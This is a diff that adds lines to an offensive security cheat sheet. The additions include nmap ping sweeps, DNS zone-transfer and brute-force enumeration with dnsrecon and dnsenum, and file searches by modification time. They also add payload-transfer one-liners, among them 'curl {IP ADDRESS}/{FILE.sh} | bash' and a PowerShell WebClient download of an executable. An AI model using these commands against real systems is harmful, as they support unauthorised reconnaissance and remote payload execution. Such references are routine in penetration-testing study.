@@ -33,6 +33,9 @@ This is intended to be viewed in the blog found here: [Offensive Security Cheat 
 # Fast scan of top 100 ports
 nmap -F {IP ADDRESS}
 
+# Ping sweep subnet
+nmap -sP {IP ADDRESS}/24
+
 # Usage
 nmap -p- --min-rate 5000 -sC -sV {IP ADDRESS}
 
@@ -143,6 +146,15 @@ crackmapexec ssh {IP ADDRESS} -u {USER.txt} -p {PASSWORD.txt}
 
 # DNS Zone Transfer using dig
 dig axfr @{IP ADDRESS} {Domain Name}
+
+#DNSRecon
+dnsrecon -d {DOMAIN} -t axfr
+
+#DNSRecon Brute Force
+dnsrecon -d {DOMAIN} -D ~/{BRUTE_LIST.txt} -t brt
+
+#DNSenum
+dnsenum {DOMAIN}
 
 
 ```
@@ -498,6 +510,12 @@ sudo python3 -m http.server {PORT}
 # Usage - Download on server machine
 wget http://{IP ADDRESS}/{FILE} -outfile {FILE}
 
+# Download file and execute in bash:
+curl {IP ADDRESS}/{FILE.sh} | bash
+
+# Download file using powershell
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://{IP ADDRESS}/{FILE.exe}','C:\Users\{USER}\{FILE.exe}')"
+
 # {IP ADDRESS}: IP Address of the client from step one (python server)
 # {FILE}:       The payload to be transferred
 ```
@@ -590,6 +608,17 @@ awk –F’:‘ ’{ print $1}’ /etc/passwd
 
 # List All Logged in Users
 who | awk ‘{print $1}’ | sort | uniq | tr ‘\n’ ‘ ’
+
+# Find files modified < 1 day
+find . -mtime -1
+find / -mtime -1
+
+# Find files modified < 5 min
+find . -mmin -5
+find / -mmin -5
+
+# Find files within date range
+find / -newermt 2022-09-15 ! -newermt 2022-09-19 -type f 2>/def/null 
 
 # Web files
 ls -alhR /var/www/ 2>/dev/null
